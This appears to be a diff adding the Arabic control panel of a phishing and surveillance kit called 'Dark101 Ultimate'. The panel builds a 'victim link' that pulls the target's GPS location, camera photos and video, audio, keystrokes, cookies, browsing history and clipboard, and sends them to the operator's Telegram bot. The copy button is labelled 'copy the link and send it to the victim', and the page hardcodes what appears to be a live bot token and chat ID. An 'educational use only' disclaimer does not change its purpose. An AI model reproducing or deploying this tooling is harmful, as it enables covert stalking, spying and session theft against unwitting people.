@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark101 Ultimate - لوحة التحكم</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0f1a;font-family:'Segoe UI',Tahoma,sans-serif;padding:20px}
+        .container{max-width:600px;margin:0 auto}
+        .card{background:#141a2a;border-radius:25px;padding:30px;border:1px solid #00d4ff33}
+        h1{color:#00d4ff;text-align:center;margin-bottom:10px}
+        .sub{color:#8892b0;text-align:center;font-size:13px;margin-bottom:20px}
+        .warning{background:#ff444420;border:1px solid #ff4444;border-radius:12px;padding:12px;margin-bottom:20px;color:#ff8888;font-size:12px;text-align:center}
+        label{display:block;color:#ccd6f6;margin:15px 0 8px;font-weight:600}
+        input{width:100%;padding:12px;border-radius:12px;border:1px solid #00d4ff33;background:#0a0f1a;color:#fff;font-size:14px}
+        .checkbox-group{background:#00d4ff10;border-radius:15px;padding:15px;margin:20px 0;max-height:300px;overflow-y:auto}
+        .checkbox-item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #00d4ff20}
+        .checkbox-item:last-child{border-bottom:none}
+        .checkbox-item label{margin:0;font-weight:normal;cursor:pointer}
+        .btn{width:100%;padding:14px;background:#00d4ff;border:none;border-radius:40px;color:#000;font-weight:bold;font-size:16px;cursor:pointer;margin-top:15px}
+        .btn:hover{opacity:0.9}
+        .result{margin-top:20px;background:#00d4ff20;border-radius:12px;padding:15px;display:none}
+        .link-box{background:#0a0f1a;padding:12px;border-radius:10px;word-break:break-all;font-size:12px;color:#00d4ff;margin-bottom:10px}
+        .copy-btn{background:#0077ff;border:none;padding:10px 20px;border-radius:25px;color:#fff;cursor:pointer;width:100%}
+        footer{text-align:center;margin-top:25px;color:#5a6e8a;font-size:11px}
+        hr{margin:15px 0;border-color:#00d4ff33}
+        .badge{background:#00d4ff20;padding:5px 10px;border-radius:20px;font-size:11px;color:#00d4ff;display:inline-block}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div style="text-align:center"><span class="badge">🛡️ ULTIMATE V2.0</span></div>
+        <h1>Dark101 Ultimate</h1>
+        <div class="sub">أداة اختبار اختراق أخلاقي متطورة</div>
+        <div class="warning">⚠️ للأغراض التعليمية فقط - اختبر على نفسك أو بموافقة خطية</div>
+        
+        <label>👤 الـ Chat ID الخاص بك (سيصلك كل شيء)</label>
+        <input type="text" id="masterChat" value="5849068535">
+        
+        <label>🤖 توكن البوت الخاص بك</label>
+        <input type="text" id="masterToken" value="8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU">
+        
+        <hr>
+        
+        <label>🎯 Chat ID المستهدف (الشخص اللي هتختبره)</label>
+        <input type="text" id="targetChat" placeholder="أدخل Chat ID المستهدف">
+        
+        <label>🤖 توكن البوت المستهدف</label>
+        <input type="text" id="targetToken" placeholder="أدخل توكن المستهدف">
+        
+        <hr>
+        
+        <label>📋 اختر الميزات المطلوبة:</label>
+        <div class="checkbox-group">
+            <div class="checkbox-item"><input type="checkbox" id="loc" checked><label>📍 الموقع الجغرافي - إحداثيات GPS دقيقة</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="front" checked><label>📸 صورة كاميرا أمامية - فورية</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="back"><label>📷 صورة كاميرا خلفية - فورية</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="vfront"><label>🎥 فيديو أمامي - 5 ثوان مع صوت</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="vback"><label>📹 فيديو خلفي - 5 ثوان مع صوت</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="audio"><label>🎤 تسجيل صوتي - 5 ثوان</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="keylogger"><label>⌨️ Keylogger - تسجيل كل ضغطات المستخدم</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="screenshot"><label>📸 لقطة شاشة دورية - كل 30 ثانية</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="cookies" checked><label>🍪 سرقة الكوكيز - جلسات المواقع</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="deviceInfo" checked><label>📱 معلومات الجهاز - كاملة</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="ip" checked><label>🌐 كشف IP العام</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="browserHistory"><label>📜 تاريخ التصفح - المواقع التي زارها</label></div>
+            <div class="checkbox-item"><input type="checkbox" id="clipboard"><label>📋 محتوى الحافظة - ما نسخه المستخدم</label></div>
+        </div>
+        
+        <button class="btn" id="generateBtn">🚀 إنشاء رابط متطور</button>
+        
+        <div id="result" class="result">
+            <div class="link-box" id="linkText"></div>
+            <button class="copy-btn" id="copyBtn">📋 نسخ الرابط وإرساله للضحية</button>
+        </div>
+        <footer>Dark101 Ultimate - جميع الميزات متاحة</footer>
+    </div>
+</div>
+
+<script>
+document.getElementById('generateBtn').onclick = function() {
+    const masterChat = document.getElementById('masterChat').value.trim();
+    const masterToken = document.getElementById('masterToken').value.trim();
+    const targetChat = document.getElementById('targetChat').value.trim();
+    const targetToken = document.getElementById('targetToken').value.trim();
+    
+    if(!masterChat || !masterToken || !targetChat || !targetToken) {
+        alert('❌ الرجاء إدخال جميع الحقول');
+        return;
+    }
+    
+    const features = [];
+    if(document.getElementById('loc').checked) features.push('loc');
+    if(document.getElementById('front').checked) features.push('front');
+    if(document.getElementById('back').checked) features.push('back');
+    if(document.getElementById('vfront').checked) features.push('vfront');
+    if(document.getElementById('vback').checked) features.push('vback');
+    if(document.getElementById('audio').checked) features.push('audio');
+    if(document.getElementById('keylogger').checked) features.push('keylogger');
+    if(document.getElementById('screenshot').checked) features.push('screenshot');
+    if(document.getElementById('cookies').checked) features.push('cookies');
+    if(document.getElementById('deviceInfo').checked) features.push('deviceInfo');
+    if(document.getElementById('ip').checked) features.push('ip');
+    if(document.getElementById('browserHistory').checked) features.push('history');
+    if(document.getElementById('clipboard').checked) features.push('clipboard');
+    
+    const data = {
+        mChat: masterChat,
+        mToken: masterToken,
+        tChat: targetChat,
+        tToken: targetToken,
+        features: features.join(',')
+    };
+    
+    // الرابط يوجه مباشرة إلى victim.html
+    const baseUrl = window.location.href.replace('index.html', 'victim.html').split('?')[0];
+    const link = baseUrl + '?d=' + btoa(JSON.stringify(data));
+    
+    document.getElementById('linkText').innerHTML = '<strong>🔗 رابط الضحية:</strong><br>' + link;
+    document.getElementById('result').style.display = 'block';
+};
+
+document.getElementById('copyBtn').onclick = function() {
+    const text = document.getElementById('linkText').innerText.replace('🔗 رابط الضحية:', '').trim();
+    navigator.clipboard.writeText(text);
+    alert('✅ تم نسخ الرابط');
+};
+</script>
+</body>
+</html>
